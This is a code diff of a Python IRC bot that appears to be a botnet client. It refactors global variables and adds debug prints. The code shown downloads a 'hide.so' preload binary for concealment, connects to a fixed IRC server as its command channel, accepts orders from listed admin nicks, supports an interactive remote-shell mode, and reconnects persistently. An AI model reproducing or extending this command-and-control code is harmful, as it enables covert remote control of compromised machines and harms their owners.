@@ -28,11 +28,15 @@ import getpass
 
 #global stuff
 operatingSystem = ""
-INTERACT = []
-admins = []
+admins = ["king", "blackbear", "bigshebang"]
 nick = ""
-DEBUG = 1
-channel = 0
+DEBUG = 0
+channel = "#lobby"
+INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
+						#index two is the boolean for if the interactive shell is with this bot
+						#index three is mode indicator. if >0 we are in shell mode, if <0 we are in functions mode
+
+irc = ""
 
 def installPreloader(): #downloads preload binary
 	response = urllib2.urlopen('https://github.com/Blizzo/IRCbot/blob/master/hide.so')
@@ -458,17 +462,24 @@ def parseCommand(command):
 					INTERACT[1] = 1
 
 #code to connect to an IRC server
-def connectToServer(nick, server, port):
+def connectToServer(irc, nick, server, port):
 	print "connecting to:", server
 
+	print nick
+	print server
+	print port 
 	connected = 0
 	while not connected:
 		try:
+			print "in try"
 			irc.connect((server, port)) #connects to the server
 			connected = 1
 		except:
+			print "in sleep"
 			connected = 0
 			time.sleep(5)
+
+	print "after connect"
 
 	irc.send("USER " + nick + " " + nick + " " + nick + " :This is a fun bot!\n") #user authentication
 	irc.send("NICK " + nick + "\n") #sets nick
@@ -491,6 +502,7 @@ def connectToServer(nick, server, port):
 			print "text received: '%s'\niteration %d" % (temp, counter)
 
 	irc.send("PRIVMSG nickserv :iNOOPE\r\n") #auth
+	print "channel is '%s'" % channel
 	irc.send("JOIN " + channel + "\n") #join the channel
 
 	if "newnick" in locals(): #if newnick exists, set nick equal to that because that is our new nickname and we need it later
@@ -500,7 +512,9 @@ def connectToServer(nick, server, port):
 
 def main():
 	#debugger
-	DEBUG = 1
+	global DEBUG
+	global irc
+	global operatingSystem
 	if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
 		DEBUG = 1
 
@@ -508,22 +522,20 @@ def main():
 	if argv[0][:2] == "./": #if we used ./ to run it, then get rid of those two characters
 		argv[0] = argv[0][2:]
 	operatingSystem = platform.system().lower() #detected os in all lowercase
-	INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
+	# INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
 							#index two is the boolean for if the interactive shell is with this bot
 							#index three is mode indicator. if >0 we are in shell mode, if <0 we are in functions mode
 
 	#IRC Settings
-	admins = ["king", "blackbear", "bigshebang"]
 	server = "jacksonsadowski.com"
 	port = 6667
-	channel = "#lobby"
 	nick = generateNick(operatingSystem)
 
 	print "The botnick is: '%s'" % nick
 
 	#setting up the sockets
 	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
-	nick = connectToServer(nick, server, port) #connect to IRC server
+	nick = connectToServer(irc, nick, server, port) #connect to IRC server
 
 	#infinite loop to listen for messages aka commands
 	while 1:
@@ -531,7 +543,7 @@ def main():
 		while not text: #if text we receive is less than 1, the other end isn't connected anymore. try to reconnect
 			irc.close()
 			irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
-			connectToServer(nick, server, port)
+			connectToServer(irc, nick, server, port)
 			time.sleep(5)
 			text = irc.recv(1024) #receive up to 1024 bytes
 
